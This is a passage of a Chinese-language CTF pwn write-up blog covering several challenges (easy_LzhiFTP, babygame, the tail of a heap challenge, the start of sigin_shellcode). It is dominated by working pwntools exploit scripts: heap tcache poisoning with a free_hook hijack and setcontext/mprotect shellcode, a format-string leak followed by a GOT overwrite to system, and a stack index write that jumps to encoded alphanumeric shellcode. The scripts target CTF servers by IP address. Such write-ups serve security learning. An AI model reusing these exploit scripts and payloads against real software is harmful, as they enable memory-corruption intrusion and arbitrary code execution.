p64(<span class="number">0</span>) + p64(<span class="number">0x211</span>) + p64(heap_base + <span class="number">0x640</span> - <span class="number">0x18</span>) + p64(heap_base + <span class="number">0x640</span> - <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, p2)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xf8</span> + p64(<span class="number">0x111</span>) + p64(free_hook)</span><br><span class="line">add(<span class="number">0x500</span>, <span class="number">3</span>, p3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget = 0x151990 + libc_base</span></span><br><span class="line">gadget = <span class="number">0x00000000001518b0</span> + libc_base</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, p64(gadget))</span><br><span class="line">heap_first = heap_base + <span class="number">0xd60</span></span><br><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span> + libc_base</span><br><span class="line">mprotect_addr = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, heap_first + <span class="number">0x200</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, heap_first + <span class="number">0x200</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">p1 = p64(heap_first + <span class="number">0x100</span>) + p64(heap_first)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(setcontext)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_base - <span class="number">0xb230</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x21000</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">7</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_first)</span><br><span class="line">p1 = p1.ljust(<span class="number">0xa8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(mprotect_addr)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + shellcode</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="number">3</span>, p1)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="easy-LzhiFTP-CHELL"><a href="#easy-LzhiFTP-CHELL" class="headerlink" title="easy_LzhiFTP_CHELL"></a>easy_LzhiFTP_CHELL</h2><p>这里就是多了一次touch，导致可以覆盖下面chunk地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(opcode, <span class="string">&quot;touch&quot;</span>, <span class="number">5uLL</span>) &amp;&amp; file_flags &lt;= <span class="number">16</span> &amp;&amp; <span class="built_in">strlen</span>(opcode) &gt; <span class="number">6</span> )</span><br></pre></td></tr></table></figure>

<p>然后利用这一次touch，打chunk的地址到puts_got，然后edit打got到system_plt即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./easy_LzhiFTP&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;39.106.131.193&#x27;</span>, <span class="number">22639</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Username: &#x27;</span>, <span class="string">&#x27;z1r0&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Input Password: &#x27;</span>, p64(<span class="number">0x0000000a00000072</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;do you like my Server??(yes/No)&#x27;</span>, <span class="string">&#x27;yes%6$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;IMLZH1-FTP&gt; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touch</span>(<span class="params">file_name, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;touch &#x27;</span> + file_name)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;write Context:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;del&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(r.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&#x27;leak_addr = &#x27;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">elf_base = leak_addr - <span class="number">0x2096</span></span><br><span class="line">li(<span class="string">&#x27;elf_base = &#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>] + elf_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    touch(<span class="string">&#x27;/bin/sh\x00&#x27;</span>, <span class="string">&#x27;z1r0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.sendlineafter(menu, <span class="string">b&#x27;touch &#x27;</span> + p64(puts_got))</span><br><span class="line">r.sendafter(<span class="string">&#x27;write Context:&#x27;</span>, <span class="string">&#x27;z1r0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_plt = elf_base + elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(system_plt))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>漏洞点在sub_401511这函数里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_401511</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *a1 = <span class="built_in">toupper</span>(*a1);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &lt;= <span class="string">&#x27;@&#x27;</span> || *a1 &gt; <span class="string">&#x27;M&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v2 = sub_4014BC(a1[<span class="number">1</span>]);</span><br><span class="line">  v3 = sub_4014BC(a1[<span class="number">2</span>]);</span><br><span class="line">  v4 = sub_4014BC(a1[<span class="number">3</span>]);</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)(*a1 - <span class="number">65</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v4;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">      result = *(_QWORD *)&amp;v5[v4 + <span class="number">0x10</span>];</span><br><span class="line">      *(_QWORD *)&amp;v5[v2] = result;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">      result = v4;</span><br><span class="line">      v5[v4 + <span class="number">16</span>] = v5[v2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v3] + v5[v4];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v3] - v5[v4];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v4] &amp; v5[v3];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v4] | v5[v3];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v4] ^ v5[v3];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;J&#x27;</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = <span class="number">2</span> * v5[v3];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;K&#x27;</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v3] &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以控制<code>v2 v3 v4</code>，并且有一块具有rwx的地址，可以覆盖到这个函数的返回地址</p>
<p>所以可以把那一个rwx地址写到v5里，然后利用C，把rwx的地址直接写到这个函数的返回地址</p>
<p>在进行漏洞之前还需要<code>expansion backpack</code>一下<code>backpack_size</code>，这样子我们就可以借助<code>Purchase props</code>来写很多的数据到rwx那里，shellcode直接用的可见字符</p>
<p>这里比较烦的是md5这一部分，这里笔者借助了一个api，<code>https://md5decrypt.net/Api/api.php?hash=&#39; + hash + &#39;&amp;hash_type=md5&amp;email=xxxx@qq.com&amp;code=xxxxx&#39;</code>，去注册一下，邮箱里会得到code，填上去即可使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;47.93.6.210&#x27;</span>, <span class="number">41031</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">a</span>):</span><br><span class="line">    url=<span class="string">&#x27;https://www.cmd5.com/&#x27;</span></span><br><span class="line">    request=requests.session()</span><br><span class="line">    html_code=request.post(url).text</span><br><span class="line">    doc=pq(html_code)</span><br><span class="line">    viewstart=doc(<span class="string">&#x27;#__VIEWSTATE&#x27;</span>).attr.value</span><br><span class="line">    VIEWSTATEGENERATOR=doc(<span class="string">&#x27;#__VIEWSTATEGENERATOR&#x27;</span>).attr.value</span><br><span class="line">    ContentPlaceHolder1_HiddenField2=doc(<span class="string">&#x27;#ctl00_ContentPlaceHolder1_HiddenField2&#x27;</span>).attr.value</span><br><span class="line"></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;__EVENTTARGET&#x27;</span>:<span class="string">&#x27;Button1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__EVENTARGUMENT&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__VIEWSTATE&#x27;</span>:viewstart,</span><br><span class="line">        <span class="string">&#x27;__VIEWSTATEGENERATOR&#x27;</span>:VIEWSTATEGENERATOR,</span><br><span class="line">        <span class="comment">#输入加密参数</span></span><br><span class="line">        <span class="string">&#x27;ctl00$ContentPlaceHolder1$TextBoxInput&#x27;</span>:a,</span><br><span class="line">        <span class="comment">#类型   这个类型可以改成别的 如加密参数书 base64 就改成base64</span></span><br><span class="line">        <span class="string">&#x27;ctl00$ContentPlaceHolder1$InputHashType&#x27;</span>:<span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ctl00$ContentPlaceHolder1$Button1&#x27;</span>:<span class="string">&#x27;查询&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ctl00$ContentPlaceHolder1$HiddenFieldAliCode&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ctl00$ContentPlaceHolder1$HiddenField1&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ctl00$ContentPlaceHolder1$HiddenField2&#x27;</span>:ContentPlaceHolder1_HiddenField2</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;referer&#x27;</span>:<span class="string">&#x27;https://www.cmd5.com/&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    request_cmd5=request.post(url,data=data,headers=headers).text</span><br><span class="line">    two_doc=pq(request_cmd5)</span><br><span class="line">    Decrypt=two_doc(<span class="string">&#x27;#LabelAnswer&#x27;</span>).text()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Decrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5dec</span>(<span class="params"><span class="built_in">hash</span></span>):</span><br><span class="line">    url = <span class="string">&#x27;https://md5decrypt.net/Api/api.php?hash=&#x27;</span> + <span class="built_in">hash</span> + <span class="string">&#x27;&amp;hash_type=md5&amp;email=xxx@qq.com&amp;code=xxxxx&#x27;</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;&gt;&gt; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_game</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please enter your level : &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        r.recvuntil(<span class="string">&#x27; == &#x27;</span>)</span><br><span class="line">        md5_enc = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="comment">#li(hex(md5_enc)[2:])</span></span><br><span class="line">        md5_enc = <span class="built_in">hex</span>(md5_enc)[<span class="number">2</span>:]</span><br><span class="line">        md5_dec = md5dec(md5_enc)</span><br><span class="line">        li(md5_dec)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(md5_dec) &lt; <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(md5_dec) &gt; <span class="number">6</span>:</span><br><span class="line">            r.sendlineafter(<span class="string">&#x27;Give me : &#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            r.sendlineafter(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            r.sendlineafter(<span class="string">&#x27;Please enter your level : &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        r.sendlineafter(<span class="string">&#x27;Give me : &#x27;</span>, <span class="built_in">str</span>(md5_dec))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Give me : &#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backpack</span>(<span class="params">size</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;What size do you need : &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">purchase_props</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Enter the letter you want to purchase&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">using_props</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">play_game(<span class="number">30</span>)</span><br><span class="line">backpack(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">purchase_props(<span class="string">&#x27;AG0GAH00AI02Co00&#x27;</span> + shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="sigin-shellcode"><a href="#sigin-shellcode" class="headerlink" title="sigin_shellcode"></a>sigin_shellcode</h2><p>这里可以直接运行shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 